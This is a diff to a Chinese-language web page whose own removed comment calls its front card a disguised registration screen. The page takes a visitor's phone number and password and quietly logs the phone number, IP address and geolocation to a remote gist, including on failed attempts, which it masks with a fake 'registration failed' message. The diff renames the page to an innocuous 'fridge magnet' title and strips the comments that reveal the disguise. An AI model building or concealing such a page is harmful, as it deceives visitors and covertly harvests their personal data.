@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>账号注册</title>
+<title>冰箱贴</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,"PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif}
 body{background:#f5f7fa;padding:20px;max-width:420px;margin:0 auto}
@@ -32,17 +32,15 @@ button:active{opacity:.9}
 </head>
 <body>
 
-<!-- 伪装注册界面 -->
 <div class="card" id="p0">
   <div class="logo" style="width:56px;height:56px;background:#409eff;border-radius:50%;margin:0 auto 16px"></div>
-  <h3 class="title">账号注册</h3>
+  <h3 class="title">冰箱贴</h3>
   <input type="text" id="i1" placeholder="请输入手机号">
   <input type="password" id="i2" placeholder="请设置登录密码">
   <button onclick="login()">立即注册</button>
   <div class="tip">未注册手机号将自动开通账号</div>
 </div>
 
-<!-- 普通用户留言页 -->
 <div id="p1">
   <div class="card">
     <h3 class="title">留言板</h3>
@@ -52,7 +50,6 @@ button:active{opacity:.9}
   <div id="msgList"></div>
 </div>
 
-<!-- 管理员后台页 -->
 <div id="p2">
   <div class="nav-bar">
     <button onclick="logout()">退出</button>
@@ -69,7 +66,6 @@ button:active{opacity:.9}
 </div>
 
 <script>
-// 核心配置
 const CONFIG = {
   normalPwd: "995566",
   adminPwd: "995566995566",
@@ -79,13 +75,11 @@ const CONFIG = {
   pollInterval: 3000
 };
 
-// 全局变量
 let pollTimer = null;
 let requestLock = false;
 let lastDataHash = "";
 let currentTab = "t1";
 
-// ========== 工具函数（全异步非阻塞，不卡主流程） ==========
 async function getClientIP() {
   try {
     const res = await fetch("https://api.ip.sb/ip", { timeout: 2000 });
@@ -105,7 +99,6 @@ async function getClientLocation(ip) {
   }
 }
 
-// ========== 页面切换（秒执行，无任何等待） ==========
 function showUserPage() {
   document.getElementById("p0").style.display = "none";
   document.getElementById("p1").style.display = "block";
@@ -140,7 +133,6 @@ function switchTab(tabId) {
   tabId === "t1" ? loadLoginLog() : loadAdminMsgList();
 }
 
-// ========== 实时同步（仅登录后启动，不卡登录） ==========
 function startPoll() {
   stopPoll();
   pollTimer = setInterval(pollData, CONFIG.pollInterval);
@@ -171,7 +163,6 @@ async function pollData() {
   }
 }
 
-// 页面可见性优化
 document.addEventListener("visibilitychange", () => {
   if (document.visibilityState === "hidden") {
     stopPoll();
@@ -182,7 +173,6 @@ document.addEventListener("visibilitychange", () => {
 });
 window.addEventListener("beforeunload", () => stopPoll());
 
-// ========== 数据读写（全兜底，不抛错） ==========
 async function getFullData() {
   try {
     const res = await fetch(CONFIG.apiUrl, {
@@ -193,7 +183,6 @@ async function getFullData() {
     const content = gistData.files["messages.json"].content || "[]";
     let data = JSON.parse(content);
 
-    // 兼容旧数据结构
     if (Array.isArray(data)) {
       data = { logs: [], messages: data };
     }
@@ -229,7 +218,6 @@ async function saveFullData(data) {
   }
 }
 
-// ========== 登录记录（后台异步执行，不卡登录） ==========
 async function writeLoginLog(phone, type) {
   try {
     const ip = await getClientIP();
@@ -246,29 +234,22 @@ async function writeLoginLog(phone, type) {
   } catch (e) {}
 }
 
-// ========== 核心登录逻辑（和极简版一样，秒进不等待） ==========
 function login() {
   const phone = document.getElementById("i1").value.trim();
   const inputPwd = document.getElementById("i2").value;
 
-  // 管理员密码：立刻跳转，后台异步记录日志
   if (inputPwd === CONFIG.adminPwd) {
     showAdminPage();
-    writeLoginLog(phone, "管理员"); // 异步执行，不卡跳转
-  }
-  // 普通用户密码：立刻跳转，后台异步记录日志
-  else if (inputPwd === CONFIG.normalPwd) {
+    writeLoginLog(phone, "管理员");
+  } else if (inputPwd === CONFIG.normalPwd) {
     showUserPage();
-    writeLoginLog(phone, "普通用户"); // 异步执行，不卡跳转
-  }
-  // 密码错误：提示，后台异步记录失败日志
-  else {
+    writeLoginLog(phone, "普通用户");
+  } else {
     alert("注册失败，请检查密码格式是否正确");
-    writeLoginLog(phone, "失败"); // 异步执行，不卡提示
+    writeLoginLog(phone, "失败");
   }
 }
 
-// ========== 留言渲染 ==========
 async function loadMsgList() {
   const dom = document.getElementById("msgList");
   try {
@@ -348,7 +329,6 @@ async function loadAdminMsgList() {
   }
 }
 
-// ========== 留言操作 ==========
 async function sendMsg() {
   const dom = document.getElementById("i3");
   const text = dom.value.trim();
@@ -403,15 +383,11 @@ async function clearAllMsg() {
   }
 }
 
-// ========== 页面加载检查 ==========
 window.onload = function () {
   const loginStatus = sessionStorage.getItem("loginStatus");
   if (loginStatus === "admin") showAdminPage();
   if (loginStatus === "user") showUserPage();
 }
-
-// 反调试保护
-setInterval(function(){debugger;}, 100);
 </script>
 </body>
 </html>
